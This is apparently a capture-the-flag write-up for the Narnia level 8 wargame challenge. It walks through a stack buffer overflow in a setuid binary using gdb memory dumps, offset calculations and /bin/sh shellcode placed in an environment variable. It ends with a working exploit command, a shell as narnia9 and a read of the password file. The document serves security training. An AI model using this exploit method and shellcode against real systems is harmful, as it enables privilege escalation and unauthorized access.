With this challenge, we can see that the main() looks for a single argument to be passed to binary and if the user inputs nothing a message would be displayed informing of correct usage. When the user passes 1 more arguments to the binary, the first argument is passed to a custom function called func(). In the func(), we can see at the start a local variable called blah as well as a char array of 20 bytes named bok are declared. The local variable blah is also the address of b. The memset() is used to zero-out the memory in the bok array. Finally a For loop is used to write the contents of blah into the array of bok, but since there isn’t any size retriction on blah, there is a potential overflow here.

```
narnia8@melinda:/narnia$ ./narnia8 $(python -c'print("A"*19)')
AAAAAAAAAAAAAAAAAAA
narnia8@melinda:/narnia$ ./narnia8 $(python -c'print("A"*20)')
AAAAAAAAAAAAAAAAAAAAÿØÿÿÿÿÿÿñå÷8×ÿÿØÿÿ
```

```
(gdb) r $(python -c'print "\x41"*20')
Starting program: /games/narnia/narnia8 $(python -c'print "\x41"*20')
 
Breakpoint 1, 0x08048467 in func ()
(gdb) x/50wx $esp
0xffffd670:     0x08048580      0xffffd688      0x00000014      0xf7fceff4
0xffffd680:     0x080484b0      0x08049794      0x41414141 <--  0x41414141 - 0xffffd688 - the start of the user supplied data
0xffffd690:     0x41414141      0x41414141      0x41414141 <--  0xffffd8b4 <--    - 0xffffd69b - the end of the user supplied data
                                                                                - 0xffffd69c - Points to the memory address of blah
0xffffd6a0:     0xffffffff      0xf7e5f116      0xffffd6c8      0x0804848d <-- RET address back to the main() [main+31]
0xffffd6b0:     0xffffd8b4 <--  0x00000000      0x080484b9      0xf7fceff4 - 0xffffd69c - Points to the memory address of blah
-- omitted output --
0xffffd8a0:     0x73656d61      0x72616e2f      0x2f61696e      0x6e72616e
0xffffd8b0:     0x00386169      0x41414141 <--  0x41414141      0x41414141 - The start of *blah
0xffffd8c0:     0x41414141      0x41414141      0x45485300      0x2f3d4c4c
0xffffd8d0:     0x2f6e6962      0x68736162      0x52455400      0x74783d4d
```
After looking at the stack above, I realised that the machine code displayed in the output must of been the memory addresses at the end of bok. With this thought in mind, I decided to confirm this by running the binary agin with the output being dumped into the a file and then using the “xxd” command I looked at the dump file.

```
narnia8@melinda:/tmp/dump$ /narnia/narnia8 $(python -c'print "\x41"*20') >> output
narnia8@melinda:/tmp/dump$ xxd output
0000000: 2f6e 6172 6e69 612f 6e61 726e 6961 3820  /narnia/narnia8
0000010: 6172 6775 6d65 6e74 0a41 4141 4141 4141  argument.AAAAAAA
0000020: 4141 4141 4141 4141 4141 4141 41bb d8ff  AAAAAAAAAAAAA...
0000030: ffff ffff ff16 f1e5 f7e8 d6ff ff8d 8404  ................
0000040: 08bb d8ff ff0a                           ......
```

Other than the “\xbb\xd8\xff\xff” which follows the A’s the memory addresses are the same. So might initial thought was I could overwrite the first memory address with the memory address of the shellcode which would be placed in an environmential variable, but this wasn’t the case because I could not overwrite the memory address at this stage. So I began thinking well since we have an overflow occuring what if we can get around this current point and continue to the overflow to overwrite the RET address with the memory address to the shellcode.

So my thinking was if I could get the binary to go back to blah and pushing data into dok I would be able to cause an overflow which would allow me to gain control of the RET. To do this I would add the memory address for blah after the initial 20 A’s.

```
(gdb) r $(python -c'print("\x41"*20 + "B"*4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia8 $(python -c'print("\x41"*20 + "B"*4)')
 
Breakpoint 1, 0x08048467 in func ()
(gdb) x/160wx $esp
0xffffd670:     0x08048580      0xffffd688      0x00000014      0xf7fceff4
0xffffd680:     0x080484b0      0x08049794      0x41414141      0x41414141
0xffffd690:     0x41414141      0x41414141      0x41414141      0xffffd842 <-- Overwrite these 4 bytes with blah's location
0xffffd6a0:     0xffffffff      0xf7e5f116      0xffffd6c8      0x0804848d <-- RET Address
0xffffd6b0:     0xffffd8b0 <--  0x00000000      0x080484b9      0xf7fceff4 - Points to blah
0xffffd6c0:     0x080484b0      0x00000000      0x00000000      0xf7e454b3
-- omitted output --
0xffffd8b0:     0x41414141 <--  0x41414141      0x41414141      0x41414141 - Start of blah
0xffffd8c0:     0x41414141      0x42424242      0x45485300      0x2f3d4c4c
0xffffd8d0:     0x2f6e6962      0x68736162      0x52455400      0x74783d4d
0xffffd8e0:     0x006d7265      0x5f485353      0x45494c43      0x323d544e

```
```
(gdb) r $(python -c'print("\x41"*20 + "\xb0\xd8\xff\xff")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia8 $(python -c'print("\x41"*20 + "\xb0\xd8\xff\xff")')
 
Breakpoint 1, 0x08048467 in func ()
(gdb) x/50wx $esp
0xffffd670:     0x08048580      0xffffd688      0x00000014      0xf7fceff4
0xffffd680:     0x080484b0      0x08049794      0x41414141      0x41414141
0xffffd690:     0x41414141      0x41414141      0x41414141      0xffffd8b0 <-- Now contains the location for blah
0xffffd6a0:     0xffffffff      0xf7e5f116      0xffffd6c8      0x0804848d <-- RET Address
0xffffd6b0:     0xffffd8b0      0x00000000      0x080484b9      0xf7fceff4
```
We now should be able to continue overflowing past the current point and overwrite the RET. There are 12 bytes between our current point and the RET address, so I modify the input to account for this information.

```
(gdb) r $(python -c'print("\x41"*20 + "\xb0\xd8\xff\xff" + "\x41"*12 + "\x42"*4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia8 $(python -c'print("\x41"*20 + "\xb0\xd8\xff\xff" + "\x41"*12 + "\x42"*4)')
 
Breakpoint 1, 0x08048467 in func ()
(gdb) x/160wx $esp
0xffffd660:     0x08048580      0xffffd678      0x00000014      0xf7fceff4
0xffffd670:     0x080484b0      0x08049794      0x41414141      0x41414141
0xffffd680:     0x41414141      0x41414141      0x41414141      0xffff42b0 <-- Now contains the location for blah
0xffffd690:     0xffffffff      0xf7e5f116      0xffffd6b8      0x0804848d <-- RET Address
0xffffd6a0:     0xffffd8a0      0x00000000      0x080484b9      0xf7fceff4
-- omitted output --
0xffffd880:     0x00000000      0x00000000      0x672f0000      0x73656d61
0xffffd890:     0x72616e2f      0x2f61696e      0x6e72616e      0x00386169
0xffffd8a0:     0x41414141 <--  0x41414141      0x41414141      0x41414141 - Location of blah
0xffffd8b0:     0x41414141      0xffffd8b0      0x41414141      0x41414141
0xffffd8c0:     0x41414141      0x42424242      0x45485300      0x2f3d4c4c
0xffffd8d0:     0x2f6e6962      0x68736162      0x52455400      0x74783d4d
```

So we weren’t able to overwrite the RET with the new input. This is because as we increase the length of the input, the location of blah changes. Which means we just need to update the memory address in the input.

```
(gdb) r $(python -c'print("\x41"*20 + "\xa0\xd8\xff\xff" + "\x41"*12 + "\x42"*4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia8 $(python -c'print("\x41"*20 + "\xa0\xd8\xff\xff" + "\x41"*12 + "\x42"*4)')
 
Breakpoint 1, 0x08048467 in func ()
(gdb) x/50wx $esp
0xffffd660:     0x08048580      0xffffd678      0x00000014      0xf7fceff4
0xffffd670:     0x080484b0      0x08049794      0x41414141      0x41414141
0xffffd680:     0x41414141      0x41414141      0x41414141      0xffffd8a0
0xffffd690:     0x41414141      0x41414141      0x41414141      0x42424242 <-- RET Address
0xffffd6a0:     0xffffd8a0      0x00000000      0x080484b9      0xf7fceff4
```

We have now successfully overwritten the RET address with 4 B’s and now all that is left to do is to attach the shellcode. The only option we have is to place the shellcode in an environmental variable, because the smallest amount of bytes needed for a “/bin/sh” shellcode I’ve seen and used is 25 bytes. In the below section, I go through the process of creating an Environmental variable containing the shellcode and then I just use GDB to have a look at the stack to find the shellcode.

 

```
export SC=$(python -c'print("\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
```

```
-- omitted output --
0xffffdef8:     0x494c0038      0x3d53454e      0x53003236      0x90903d43
0xffffdf08:     0x90909090 <--  0x90909090      0x90909090      0x90909090 - Start of shellcode
0xffffdf18:     0x90909090      0x90909090      0x90909090      0x6850c031
0xffffdf28:     0x68732f2f      0x69622f68      0x50e3896e      0x89e18953
0xffffdf38:     0xcd0bb0c2      0x4f480080      0x2f3d454d      0x656d6f68
0xffffdf48:     0x72616e2f      0x3861696e      0x4c485300      0x313d4c56
0xffffdf58:     0x474f4c00      0x454d414e      0x72616e3d      0x3861696e
0xffffdf68:     0x48535300      0x4e4f435f      0x5443454e      0x3d4e4f49
-- omitted output --
```
```
(gdb) r $(python -c'print("\x41"*20 + "\xa1\xd8\xff\xff" + "\x41"*12 + "\x08\xdf\xff\xff")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
 
Starting program: /games/narnia/narnia8 $(python -c'print("\x41"*20 + "\xa1\xd8\xff\xff" + "\x41"*12 + "\x08\xdf\xff\xff")')
 
Breakpoint 2, 0x08048467 in func ()
(gdb) x/50wx $esp
0xffffd660:     0x08048580      0xffffd678      0x00000014      0xf7fceff4
0xffffd670:     0x080484b0      0x08049794      0x41414141      0x41414141
0xffffd680:     0x41414141      0x41414141      0x41414141      0xffffd8a1
0xffffd690:     0x41414141      0x41414141      0x41414141      0xffffdf08
0xffffd6a0:     0xffffd8a1      0x00000000      0x080484b9      0xf7fceff4
0xffffd6b0:     0x080484b0      0x00000000      0x00000000      0xf7e454b3
0xffffd6c0:     0x00000002      0xffffd754      0xffffd760      0xf7fd3000
0xffffd6d0:     0x00000000      0xffffd71c      0xffffd760      0x00000000
0xffffd6e0:     0x0804820c      0xf7fceff4      0x00000000      0x00000000
0xffffd6f0:     0x00000000      0x64f5254f      0x53f0415f      0x00000000
0xffffd700:     0x00000000      0x00000000      0x00000002      0x08048340
0xffffd710:     0x00000000      0xf7ff0a90      0xf7e453c9      0xf7ffcff4
0xffffd720:     0x00000002      0x08048340
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA¡ØÿÿAAAAAAAAAAAßÿÿ¡Øÿÿ
 
Breakpoint 3, 0xffffdf08 in ?? ()
(gdb) c
Continuing.
process 10175 is executing new program: /proc/10175/exe
/proc/10175/exe: Permission denied.
```

NOTE: I had to change the memory address for blah, as it changed again after the shellcode was added to an environment variable.

Unfortunately though in GDB I was able to hit the shellcode successfully but outside GDB I was not able to successfully land on my nope sled and hit my shellcode. So wghat I decided to do pipe my output in xxd, like I did originally to identify the memory addresses, to see what they are being changed too.

```
narnia8@melinda:/narnia$ ./narnia8 $(python -c'print("\x41"*20 + "\xa0\xd8\xff\xff" + "\x41"*12 + "\x08\xdf\xff\xff")')
AAAAAAAAAAAAAAAAAAAA Aÿÿÿÿÿÿñå÷èÖÿ¯Øÿÿ
narnia8@melinda:/narnia$ ./narnia8 $(python -c'print("\x41"*20 + "\xa0\xd8\xff\xff" + "\x41"*12 + "\x08\xdf\xff\xff")') | xxd
0000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000010: 4141 4141 a041 ffff ffff ffff 16f1 e5f7  AAAA.A..........
0000020: e8d6 ffff 8d84 0408 afd8 ffff 0a         .............
```

In the output from xxd, I can see that the memory address for blah is being changed to 0xffffd8af, so my original value is being changed by 16 bytes. I made the modifications and run the code again.

```
narnia8@melinda:/narnia$ ./narnia8 $(python -c'print("\x41"*20 + "\xaf\xd8\xff\xff" + "\x41"*12 + "\x08\xdf\xff\xff")')
AAAAAAAAAAAAAAAAAAAA¯ØÿÿAAAAAAAAAAAßÿÿ¯Øÿÿ
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9

```
